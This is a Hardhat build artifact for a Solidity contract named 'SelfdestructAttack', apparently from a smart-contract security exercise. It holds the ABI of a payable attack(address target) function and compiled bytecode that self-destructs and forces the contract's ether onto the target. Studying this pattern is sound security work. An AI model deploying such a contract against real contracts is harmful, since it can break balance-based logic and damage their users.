{
  "_format": "hh-sol-artifact-1",
  "contractName": "SelfdestructAttack",
  "sourceName": "contracts/SelfdestructAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "target",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052348015600f57600080fd5b5060a28061001e6000396000f3fe608060405260043610601c5760003560e01c8063d018db3e146021575b600080fd5b6030602c366004603e565b6032565b005b806001600160a01b0316ff5b600060208284031215604f57600080fd5b81356001600160a01b0381168114606557600080fd5b939250505056fea2646970667358221220b4452451b99a60f022d5f29c6a65130e93df0c9314a90c1e4db6bafd6fc3120a64736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}